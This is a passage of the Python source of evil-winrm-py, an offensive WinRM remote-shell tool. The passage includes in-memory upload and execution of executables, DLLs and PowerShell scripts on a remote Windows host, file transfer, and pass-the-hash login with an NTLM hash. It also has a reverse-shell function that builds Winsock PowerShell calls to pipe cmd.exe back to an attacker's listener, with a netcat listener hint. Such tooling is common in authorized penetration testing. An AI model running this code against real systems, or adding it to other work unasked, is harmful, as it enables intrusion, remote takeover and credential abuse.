                    CYAN
                    + "[*] New commands available (use TAB to autocomplete):"
                    + RESET
                )
                print(", ".join(new_suggestions))
    except KeyboardInterrupt:
        if ps.state == PSInvocationState.RUNNING:
            log.info("Stopping command execution.")
            ps.stop()


def run_ps(r_pool: RunspacePool, local_path: str) -> None:
    """Runs a local PowerShell script on the remote host."""
    ps = PowerShell(r_pool)
    try:
        try:
            script = _read_text_auto_encoding(local_path)
        except Exception as e:
            print(RED + f"[-] Error reading ps script file: {e}" + RESET)
            log.error(f"Error reading ps script file: {e}")
            return

        ps.add_script(script)
        ps.begin_invoke()

        cursor = 0
        while ps.state == PSInvocationState.RUNNING:
            with DelayedKeyboardInterrupt():
                ps.poll_invoke()
            output = ps.output
            for line in output[cursor:]:
                print(line)
            cursor = len(output)

        if ps.streams.error:
            print(RED + "[-] Failed to run PowerShell script." + RESET)
            log.error(f"Failed to run PowerShell script '{local_path}'.")
            for error in ps.streams.error:
                print(RED + error._to_string + RESET)
                log.error("Error: {}".format(error._to_string))
                log.error("\tCategoryInfo: {}".format(error.message))
                log.error("\tFullyQualifiedErrorId: {}".format(error.fq_error))
        else:
            print(GREEN + "[+] PowerShell script ran successfully." + RESET)
            log.info(f"PowerShell script '{local_path}' ran successfully.")
    except KeyboardInterrupt:
        if ps.state == PSInvocationState.RUNNING:
            log.info("Stopping command execution.")
            ps.stop()


def load_dll(r_pool: RunspacePool, local_path: str) -> None:
    """Uploads in-memory and loads a local DLL on the remote host, then invokes a specified function."""
    ps = PowerShell(r_pool)
    try:
        with open(local_path, "rb") as dll_file:
            dll_data = dll_file.read()
            base64_dll = base64.b64encode(dll_data).decode("utf-8")

        script = get_ps_script("loaddll.ps1")
        ps.add_script(script)
        ps.add_parameter("Base64Dll", base64_dll)
        ps.begin_invoke()

        cursor = 0
        name = ""
        while ps.state == PSInvocationState.RUNNING:
            with DelayedKeyboardInterrupt():
                ps.poll_invoke()
            output = ps.output
            for line in output[cursor:]:
                line = json.loads(line)
                if line["Type"] == "Error":
                    print(RED + f"[-] Error: {line['Message']}" + RESET)
                    log.error(f"Error: {line['Message']}")
                    return
                elif line["Type"] == "Metadata":
                    if "Name" in line:
                        name = line["Name"]
                        print(GREEN + f"[+] Loading '{name}' as a module..." + RESET)
                        log.info(f"Loading '{name}' as a module...")
                    elif "Funcs" in line:
                        print(
                            CYAN
                            + "[*] New commands available available (use TAB to autocomplete):"
                            + RESET
                        )
                        print(", ".join(line["Funcs"]))
                        global COMMAND_SUGGESTIONS
                        new_suggestions = []
                        for func in line["Funcs"]:
                            if func not in COMMAND_SUGGESTIONS:
                                new_suggestions += [func]
                        if new_suggestions:
                            COMMAND_SUGGESTIONS += new_suggestions
            cursor = len(output)

        if ps.streams.error:
            print(RED + "[-] Failed to load DLL" + RESET)
            log.error(f"Failed to load DLL '{local_path}'")
            for error in ps.streams.error:
                print(RED + error._to_string + RESET)
                log.error("Error: {}".format(error._to_string))
                log.error("\tCategoryInfo: {}".format(error.message))
                log.error("\tFullyQualifiedErrorId: {}".format(error.fq_error))
        else:
            print(GREEN + f"[+] DLL '{name}' loaded successfully." + RESET)
            log.info(f"DLL '{local_path}' loaded successfully.")
    except KeyboardInterrupt:
        if ps.state == PSInvocationState.RUNNING:
            log.info("Stopping command execution.")
            ps.stop()


def run_exe(r_pool: RunspacePool, local_path: str, args: str = "") -> None:
    """Uploads in-memory and runs a local executable on the remote host."""
    ps = PowerShell(r_pool)
    file_path = Path(local_path)
    file_size = file_path.stat().st_size
    print(
        BLUE + f"[*] Uploading in-memory ({file_size} bytes) and executing..." + RESET
    )
    log.info(f"Uploading in-memory {file_size} bytes and executing...")
    try:
        with open(local_path, "rb") as exe_file:
            exe_data = exe_file.read()
            base64_exe = base64.b64encode(exe_data).decode("utf-8")

        script = get_ps_script("exec.ps1")
        ps.add_script(script)
        ps.add_parameter("Base64Exe", base64_exe)
        ps.add_parameter("Args", args.split(" "))
        ps.begin_invoke()

        cursor = 0
        while ps.state == PSInvocationState.RUNNING:
            with DelayedKeyboardInterrupt():
                ps.poll_invoke()
            output = ps.output
            for line in output[cursor:]:
                print(line)
            cursor = len(output)

        if ps.streams.error:
            print(RED + "[-] Failed to run executable." + RESET)
            log.error(f"Failed to run executable '{local_path}'.")
            for error in ps.streams.error:
                print(RED + error._to_string + RESET)
                log.error("Error: {}".format(error._to_string))
                log.error("\tCategoryInfo: {}".format(error.message))
                log.error("\tFullyQualifiedErrorId: {}".format(error.fq_error))
        else:
            print(GREEN + "[+] Executable ran successfully." + RESET)
            log.info(f"Executable '{local_path}' ran successfully.")
    except KeyboardInterrupt:
        if ps.state == PSInvocationState.RUNNING:
            log.info("Stopping command execution.")
            ps.stop()


def revshell(r_pool: RunspacePool, target_ip: str, target_port: int) -> None:
    """
    Spawn a reverse shell on the remote host that connects back to the specified IP:PORT.

    This creates a cmd.exe process with stdin/stdout/stderr redirected through a socket
    connection to the attacker's machine. Uses Windows Socket API (Winsock2) via
    dynamically loaded DLL imports.

    Args:
        r_pool: The RunspacePool for executing PowerShell commands
        target_ip: IP address to connect back to
        target_port: Port to connect back to
    """
    try:
        # Parse and validate IP address, convert to packed bytes
        ip = ip_address(target_ip).packed
        # Split port into high and low bytes (network byte order / big-endian)
        p_hi, p_lo = (target_port >> 8) & 0xFF, target_port & 0xFF
    except Exception as e:
        print(RED + f"[-] Invalid IP address or port: {e}" + RESET)
        log.error(f"Invalid IP address or port: {e}")
        return

    print(BLUE + f"[*] Spawning reverse shell to {target_ip}:{target_port}..." + RESET)
    log.info(f"Spawning reverse shell to {target_ip}:{target_port}")

    # Build the PowerShell commands for the reverse shell
    # 1. Import DLL functions (WSAStartup, WSASocket, WSAConnect, CreateProcess)
    # 2. Initialize Winsock
    # 3. Create a TCP socket
    # 4. Connect to the attacker's IP:PORT
    # 5. Create STARTUPINFO structure with socket handles for stdin/stdout/stderr
    # 6. Spawn cmd.exe with redirected I/O
    commands = [
        # Import the required DLL functions
        _revshell_imports["WSAStartup"],
        _revshell_imports["WSASocket"],
        _revshell_imports["WSAConnect"],
        _revshell_imports["CreateProcess"],
        # Initialize Winsock 2.2
        f"{_revshell_calls['WSAStartup']}(0x202,(New-Object byte[] 64))",
        # Create TCP socket: AF_INET(2), SOCK_STREAM(1), IPPROTO_TCP(6)
        f"$sock = {_revshell_calls['WSASocket']}(2,1,6,0,0,0)",
        # Connect to target: sockaddr_in structure as byte array
        # [AF_INET(2), 0, port_hi, port_lo, ip[0], ip[1], ip[2], ip[3], padding...]
        f"{_revshell_calls['WSAConnect']}($sock,[byte[]](2,0,{p_hi},{p_lo},{ip[0]},{ip[1]},{ip[2]},{ip[3]},0,0,0,0,0,0,0,0),16,0,0,0,0)",
        # Create STARTUPINFO structure:
        # cb=104, dwFlags=STARTF_USESTDHANDLES(0x100), hStdInput/Output/Error = socket
        f"$sinfo = [int64[]](104,0,0,0,0,0,0,0x10100000000,0,0,$sock,$sock,$sock)",
        # CreateProcess: spawn cmd.exe with socket-redirected I/O
        f"{_revshell_calls['CreateProcess']}(0,'cmd.exe',0,0,1,0,0,0,$sinfo,(New-Object byte[] 32))",
        # Clean up variables
        f"Remove-Variable @('sock','sinfo')",
    ]

    try:
        for cmd in commands:
            log.debug(f"Executing revshell command: {cmd}")
            ps = PowerShell(r_pool)
            ps.add_cmdlet("Invoke-Expression").add_parameter("Command", cmd)
            ps.add_cmdlet("Out-String").add_parameter("Stream")
            ps.begin_invoke()

            while ps.state == PSInvocationState.RUNNING:
                with DelayedKeyboardInterrupt():
                    ps.poll_invoke()

            if ps.streams.error:
                for error in ps.streams.error:
                    print(RED + error._to_string + RESET)
                    log.error("Error: {}".format(error._to_string))

        print(
            GREEN + f"[+] Reverse shell spawned. Check your listener at {target_ip}:{target_port}" + RESET
        )
        log.info(f"Reverse shell spawned to {target_ip}:{target_port}")

    except KeyboardInterrupt:
        print(RED + "\n[-] Reverse shell setup interrupted." + RESET)
        log.info("Reverse shell setup interrupted by user.")


def interactive_shell(r_pool: RunspacePool) -> None:
    """Runs the interactive pseudo-shell."""
    log.info("Starting interactive PowerShell session...")

    # Set up history file
    if not HISTORY_FILE.exists():
        Path(HISTORY_FILE).touch()
    prompt_history = FileHistory(HISTORY_FILE)
    prompt_session = PromptSession(history=prompt_history)

    # Set up command completer
    completer = CommandPathCompleter(r_pool)

    while True:
        try:
            try:
                prompt_text = ANSI(get_prompt(r_pool))
            except (KeyboardInterrupt, EOFError):
                return
            command = prompt_session.prompt(
                prompt_text,
                completer=completer,
                complete_while_typing=False,
            )

            if not command:
                continue

            # Normalize command input
            command_lower = str(command).strip().lower()

            # Check for exit command
            if command_lower == "exit":
                log.info("Exiting interactive shell.")
                return
            elif command_lower in ["clear", "cls"]:
                log.info("Clearing the screen.")
                clear()  # Clear the screen
                continue
            elif command_lower == "menu":
                log.info("Displaying menu.")
                show_menu()
                continue
            elif command_lower.startswith("download"):
                command_parts = quoted_command_split(command)
                if len(command_parts) < 3:
                    print(
                        RED + "[-] Usage: download <remote_path> <local_path>" + RESET
                    )
                    continue
                remote_path = command_parts[1].strip('"')
                local_path = command_parts[2].strip('"').strip("'")

                remote_file, streams, had_errors = run_ps_cmd(
                    r_pool, f"(Resolve-Path -Path '{remote_path}').Path"
                )
                if not remote_file:
                    print(
                        RED
                        + f"[-] Remote file '{remote_path}' does not exist or you do not have permission to access it."
                        + RESET
                    )
                    continue

                file_name = remote_file.split("\\")[-1]

                if Path(local_path).expanduser().is_dir() or local_path.endswith(
                    os.sep
                ):
                    local_path = (
                        Path(local_path).expanduser().resolve().joinpath(file_name)
                    )
                else:
                    local_path = Path(local_path).expanduser().resolve()

                download_file(r_pool, remote_file, str(local_path))
                continue
            elif command_lower.startswith("upload"):
                command_parts = quoted_command_split(command)
                if len(command_parts) < 3:
                    print(RED + "[-] Usage: upload <local_path> <remote_path>" + RESET)
                    continue
                local_path = command_parts[1].strip('"').strip("'")
                remote_path = command_parts[2].strip('"')

                if not Path(local_path).expanduser().exists():
                    print(
                        RED + f"[-] Local file '{local_path}' does not exist." + RESET
                    )
                    continue

                file_name = local_path.split(os.sep)[-1]

                if not re.match(r"^[a-zA-Z]:", remote_path):
                    # If the path doesn't start with a drive letter, prepend the current directory
                    pwd, streams, had_errors = run_ps_cmd(r_pool, "$pwd.Path")
                    if remote_path == ".":
                        remote_path = f"{pwd}\\{file_name}"
                    else:
                        remote_path = f"{pwd}\\{remote_path}"

                if remote_path.endswith("\\"):
                    remote_path = f"{remote_path}{file_name}"

                upload_file(
                    r_pool, str(Path(local_path).expanduser().resolve()), remote_path
                )
                continue
            elif command_lower.startswith("loadps"):
                command_parts = quoted_command_split(command)
                if len(command_parts) < 2:
                    print(RED + "[-] Usage: loadps <local_path>" + RESET)
                    continue
                local_path = command_parts[1].strip('"')
                local_path = Path(local_path).expanduser().resolve()

                if not local_path.exists():
                    print(
                        RED
                        + f"[-] Local PowerShell script '{local_path}' does not exist."
                        + RESET
                    )
                    continue
                elif local_path.suffix.lower() != ".ps1":
                    print(
                        RED
                        + "[-] Please provide a valid PowerShell script file with .ps1 extension."
                        + RESET
                    )
                    continue

                load_ps(r_pool, local_path)
                continue
            elif command_lower.startswith("runps"):
                command_parts = quoted_command_split(command)
                if len(command_parts) < 2:
                    print(RED + "[-] Usage: runps <local_path>" + RESET)
                    continue
                local_path = command_parts[1].strip('"')
                local_path = Path(local_path).expanduser().resolve()

                if not local_path.exists():
                    print(
                        RED
                        + f"[-] Local PowerShell script '{local_path}' does not exist."
                        + RESET
                    )
                    continue
                elif local_path.suffix.lower() != ".ps1":
                    print(
                        RED
                        + "[-] Please provide a valid PowerShell script file with .ps1 extension."
                        + RESET
                    )
                    continue

                run_ps(r_pool, local_path)
                continue
            elif command_lower.startswith("loaddll"):
                command_parts = quoted_command_split(command)
                if len(command_parts) < 2:
                    print(RED + "[-] Usage: loaddll <local_path>" + RESET)
                    continue
                local_path = command_parts[1].strip('"')
                local_path = Path(local_path).expanduser().resolve()

                if not local_path.exists():
                    print(RED + f"[-] Local dll '{local_path}' does not exist." + RESET)
                    continue
                elif local_path.suffix.lower() != ".dll":
                    print(
                        RED
                        + "[-] Please provide a valid dll file with .dll extension."
                        + RESET
                    )
                    continue
                load_dll(r_pool, local_path)
                continue
            elif command_lower.startswith("runexe"):
                command_parts = quoted_command_split(command)
                if len(command_parts) < 2:
                    print(RED + "[-] Usage: runexe <local_path> [args]" + RESET)
                    continue
                local_path = command_parts[1].strip('"')
                local_path = Path(local_path).expanduser().resolve()

                if not local_path.exists():
                    print(
                        RED
                        + f"[-] Local executable '{local_path}' does not exist."
                        + RESET
                    )
                    continue
                elif local_path.suffix.lower() != ".exe":
                    print(
                        RED
                        + "[-] Please provide a valid executable file with .exe extension."
                        + RESET
                    )
                    continue

                args = " ".join(command_parts[2:]) if len(command_parts) > 2 else ""

                run_exe(r_pool, local_path, args)
                continue
            elif command_lower.startswith("revshell"):
                command_parts = split_args(command[len("revshell "):].strip())
                if len(command_parts) < 2:
                    print(RED + "[-] Usage: revshell <IP> <PORT>" + RESET)
                    print(
                        CYAN
                        + "[*] Spawns a reverse shell with stdin/stdout/stderr redirected to your listener."
                        + RESET
                    )
                    print(
                        CYAN
                        + "[*] Start a listener first: nc -lvnp <PORT>"
                        + RESET
                    )
                    continue

                target_ip = command_parts[0]
                try:
                    target_port = int(command_parts[1])
                    if not (1 <= target_port <= 65535):
                        raise ValueError("Port out of range")
                except ValueError:
                    print(RED + f"[-] Invalid port: {command_parts[1]}. Must be 1-65535." + RESET)
                    continue

                revshell(r_pool, target_ip, target_port)
                continue
            else:
                try:
                    ps = PowerShell(r_pool)
                    ps.add_cmdlet("Invoke-Expression").add_parameter("Command", command)
                    ps.add_cmdlet("Out-String").add_parameter("Stream")
                    ps.begin_invoke()
                    log.info("Executing command: {}".format(command))

                    cursor = 0
                    while ps.state == PSInvocationState.RUNNING:
                        with DelayedKeyboardInterrupt():
                            ps.poll_invoke()
                        output = ps.output
                        for line in output[cursor:]:
                            print(line)
                        cursor = len(output)
                    log.info("Command execution completed.")
                    log.info("Output: {}".format("\n".join(output)))

                    if ps.streams.error:
                        for error in ps.streams.error:
                            print(RED + error._to_string + RESET)
                            log.error("Error: {}".format(error._to_string))
                            log.error("\tCategoryInfo: {}".format(error.message))
                            log.error(
                                "\tFullyQualifiedErrorId: {}".format(error.fq_error)
                            )
                except KeyboardInterrupt:
                    if ps.state == PSInvocationState.RUNNING:
                        log.info("Stopping command execution.")
                        ps.stop()
        except KeyboardInterrupt:
            print("\nCaught Ctrl+C. Type 'exit' or press Ctrl+D to exit.")
            continue  # Allow user to continue or type exit
        except EOFError:
            return  # Exit on Ctrl+D


# --- Main Function ---
def main():
    print(
        """          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\\ V | | |___\\ V  V | | ' \\| '_| '  |___| '_ | || |
 \\___|\\_/|_|_|    \\_/\\_/|_|_||_|_| |_|_|_|  | .__/\\_, |
                                            |_|   |__/  v{}\n""".format(
            __version__
        )
    )
    parser = argparse.ArgumentParser(
        epilog="For more information about this project, visit https://github.com/adityatelange/evil-winrm-py"
        "\nFor user guide, visit https://github.com/adityatelange/evil-winrm-py/blob/main/docs/usage.md",
        formatter_class=argparse.RawTextHelpFormatter,
    )

    parser.add_argument(
        "-i",
        "--ip",
        required=True,
        help="remote host IP or hostname",
    )
    parser.add_argument("-u", "--user", help="username")
    parser.add_argument("-p", "--password", help="password")
    parser.add_argument("-H", "--hash", help="nthash")
    parser.add_argument(
        "--priv-key-pem",
        help="local path to private key PEM file",
    )
    parser.add_argument(
        "--cert-pem",
        help="local path to certificate PEM file",
    )
    parser.add_argument("--uri", default="wsman", help="wsman URI (default: /wsman)")
    parser.add_argument(
        "--ua",
        default="Microsoft WinRM Client",
        help='user agent for the WinRM client (default: "Microsoft WinRM Client")',
    )
    parser.add_argument(
        "--port", type=int, default=5985, help="remote host port (default 5985)"
    )
    if is_kerb_available:
        parser.add_argument(
            "--spn-prefix",
            help="specify spn prefix",
        )
        parser.add_argument(
            "--spn-hostname",
            help="specify spn hostname",
        )
        parser.add_argument(
            "-k", "--kerberos", action="store_true", help="use kerberos authentication"
        )
    parser.add_argument(
        "--no-pass", action="store_true", help="do not prompt for password"
    )
    parser.add_argument("--ssl", action="store_true", help="use ssl")
    parser.add_argument("--log", action="store_true", help="log session to file")
    parser.add_argument("--debug", action="store_true", help="enable debug logging")
    parser.add_argument("--no-colors", action="store_true", help="disable colors")
    parser.add_argument(
        "--version", action="version", version=__version__, help="show version"
    )

    args = parser.parse_args()

    # Set Default values
    auth = "ntlm"  # this can be 'negotiate'
    encryption = "auto"
    username = args.user

    # --- Run checks on provided arguments ---
    if args.no_colors:
        global RESET, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, BOLD
        RESET = RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = BOLD = ""

    if args.cert_pem or args.priv_key_pem:
        auth = "certificate"
        encryption = "never"
        args.ssl = True
        args.no_pass = True
        if not args.cert_pem or not args.priv_key_pem:
            print(
                RED
                + "[-] Both cert.pem and priv-key.pem must be provided for certificate authentication."
                + RESET
            )
            sys.exit(1)

    if args.hash and args.password:
        print(RED + "[-] You cannot use both password and hash." + RESET)
        sys.exit(1)

    if args.hash:
        ntlm_hash_pattern = r"^[0-9a-fA-F]{32}$"
        if re.match(ntlm_hash_pattern, args.hash):
            args.password = "00000000000000000000000000000000:{}".format(args.hash)
        else:
            print(RED + "[-] Invalid NTLM hash format." + RESET)
            sys.exit(1)

    if args.uri:
        if args.uri.startswith("/"):
            args.uri = args.uri.lstrip("/")

    if args.ssl and (args.port == 5985):
        args.port = 5986

    if args.log or args.debug:
        level = logging.INFO
        # Disable all loggers except the root logger
        if args.debug:
            print(BLUE + "[*] Debug logging enabled." + RESET)
            level = logging.DEBUG
            os.environ["KRB5_TRACE"] = str(LOG_PATH)  # Enable Kerberos trace logging
        else:
            # Disable all loggers except the root logger
            for name in logging.root.manager.loggerDict:
                if not name.startswith("evil_winrm_py"):
                    logging.getLogger(name).disabled = True
        # Set up logging to a file
        try:
            logging.basicConfig(
                level=level,
                format="%(asctime)s - %(levelname)s - %(name)s - %(message)s",
                filename=LOG_PATH,
            )
            print(BLUE + "[*] Logging session to {}".format(LOG_PATH) + RESET)
        except PermissionError as pe:
            print(
                RED + "[-] Permission denied to write to log file '{}'."
                " Please check the permissions or run with elevated privileges.".format(
                    LOG_PATH
                )
                + RESET
            )
            log.disabled = True
    else:
        log.disabled = True

    # --- Initialize WinRM Session ---
    log.info("--- Evil-WinRM-Py v{} started ---".format(__version__))
    try:
        if is_kerb_available:
            if args.kerberos:
                auth = "kerberos"
                args.spn_prefix = (
                    args.spn_prefix or "http"
                )  # can also be cifs, ldap, HOST
                if not args.user:
                    try:
                        cred = GSSAPICredentials(RawCreds())
                        username = cred.name
                    except MissingCredentialsError:
                        print(
                            MAGENTA
                            + "[%] No credentials cache found for Kerberos authentication."
                            + RESET
                        )
                        sys.exit(1)
                    except ExpiredCredentialsError as ece:
                        print(
                            RED + "[-] The Kerberos credentials have expired. " + RESET
                        )
                        log.error("Expired credentials error: {}".format(ece))
                        sys.exit(1)
                # User needs to set environment variables `KRB5CCNAME` and `KRB5_CONFIG` as per requirements
                # example: export KRB5CCNAME=/tmp/krb5cc_1000
                # example: export KRB5_CONFIG=/etc/krb5.conf
            elif args.spn_prefix or args.spn_hostname:
                args.spn_prefix = args.spn_hostname = None  # Reset to None
                print(
                    MAGENTA
                    + "[%] SPN prefix/hostname is only used with Kerberos authentication."
                    + RESET
                )
        else:
            args.spn_prefix = args.spn_hostname = None

        if args.no_pass:
            args.password = None
        elif args.user and not args.password:
            args.password = prompt("Password: ", is_password=True)
            if not args.password:
                args.password = None

        if username:
            log.info(
                "[*] Connecting to '{}:{}' as '{}'"
                "".format(args.ip, args.port, username, auth)
            )
            print(
                BLUE + "[*] Connecting to '{}:{}' as '{}'"
                "".format(args.ip, args.port, username) + RESET
            )
        else:
            log.info("[*] Connecting to '{}:{}'".format(args.ip, args.port))
            print(BLUE + "[*] Connecting to '{}:{}'".format(args.ip, args.port) + RESET)

        with WSManEWP(
            server=args.ip,
            port=args.port,
            auth=auth,
            encryption=encryption,
            username=args.user,
            password=args.password,
            ssl=args.ssl,
            cert_validation=False,
            path=args.uri,
            negotiate_service=args.spn_prefix,
            negotiate_hostname_override=args.spn_hostname,
            certificate_key_pem=args.priv_key_pem,
            certificate_pem=args.cert_pem,
            user_agent=args.ua,
        ) as wsman:
            with RunspacePool(wsman) as r_pool:
                interactive_shell(r_pool)
    except (KeyboardInterrupt, EOFError):
        sys.exit(0)
    except WinRMTransportError as wte:
        print(RED + "[-] {}".format(wte) + RESET)
        log.error("WinRM transport error: {}".format(wte))
        sys.exit(1)
    except ConnectionError as ce:
        print(
            RED + "[-] Failed to connect to the remote host: {}:{}"
            "".format(args.ip, args.port) + RESET
        )
        log.error("Connection error: {}".format(ce))
        sys.exit(1)
    except AuthenticationError as ae:
        print(RED + "[-] {}".format(ae) + RESET)
        log.error("Authentication failed: {}".format(ae))
        sys.exit(1)
    except WSManFaultError as wfe:
        print(RED + "[-] {}".format(wfe) + RESET)
        log.error("WSMan fault error: {}".format(wfe))
        sys.exit(1)
    except Krb5Error as ke:
        print(RED + "[-] {}".format(ke) + RESET)
        log.error("Kerberos error: {}".format(ke))
        sys.exit(1)
    except (OperationNotAvailableError, NoCredentialError) as se:
        print(RED + "[-] {}".format(se._context_message) + RESET)
        print(RED + "[-] {}".format(se._BASE_MESSAGE) + RESET)
        log.error("SpnegoError error: {}".format(se))
        sys.exit(1)
    except SpnegoError as se:
        print(RED + "[-] {}".format(se._context_message) + RESET)
        print(RED + "[-] {}".format(se.message) + RESET)
        log.error("SpnegoError error: {}".format(se))
        sys.exit(1)
    except Exception as e:
        traceback.print_exc()
        log.exception("An unexpected error occurred: {}".format(e), exc_info=True)
        sys.exit(1)
    finally:
        log.info("--- Evil-WinRM-Py v{} ended ---".format(__version__))


if __name__ == "__main__":
    main()
